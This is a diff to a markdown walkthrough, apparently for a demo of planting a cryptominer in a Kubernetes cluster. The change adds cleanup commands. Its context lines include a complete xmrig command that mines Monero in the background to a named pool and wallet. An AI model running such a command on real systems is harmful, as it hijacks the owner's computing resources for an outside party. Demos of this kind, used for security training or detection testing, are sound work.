@@ -365,4 +365,14 @@ cd xmrig-6.16.4
 ./xmrig --donate-level 8 -o xmr-us-east1.nanopool.org:14433 -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero --background
 ```
 
-Now the cryptominer process is running in the k8s cluster!
+Now the cryptominer process is running in the k8s cluster! <br/>
+To delete all remnants of the miner, it's file directory and the tarbal:
+
+```
+rm -r xmrig-6.16.4
+```
+
+Removes the tarbal for the next demo:
+```
+rm -r xmrig-6.16.4-linux-static-x64.tar.gz
+```
